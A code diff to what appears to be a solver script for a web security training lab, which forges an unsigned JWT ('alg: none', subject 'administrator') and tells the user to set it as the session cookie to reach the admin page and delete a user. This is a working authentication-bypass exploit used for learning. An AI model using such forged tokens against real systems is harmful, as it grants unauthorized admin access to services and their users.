@@ -1,5 +1,6 @@
 import { getParsedInputFromUser } from "../../../utils/getParsedInputFromUser.js";
 import { runTasks } from "../../../utils/runTasks.js";
+import { JWT } from "../utils/JWT.js";
 
 const { labUrl } = getParsedInputFromUser({
   description:
@@ -11,16 +12,15 @@ runTasks([task]);
 function task() {
   console.log(`
 To solve the lab:
-  1. Edit your browser cookie for the lab site with key "session" and value "${getJwtToken()}"
+  1. Edit your browser cookie for the lab site with key "session" and value "${createAdminJwtWithNoneAlg()}"
   2. Go to admin page:
-  "${labUrl + "admin"}"
+  "${labUrl}admin"
   3. Delete carlos's account
 `);
 }
 
-function getJwtToken() {
-  const adminUsername = "administrator";
-  const jwtHeader = JSON.stringify({ alg: "none" });
-  const jwtPayload = JSON.stringify({ sub: adminUsername });
-  return `${Buffer.from(jwtHeader).toString("base64url")}.${Buffer.from(jwtPayload).toString("base64url")}.`;
+function createAdminJwtWithNoneAlg() {
+  const header = { alg: "none" };
+  const payload = { sub: "administrator" };
+  return new JWT({ header, payload });
 }
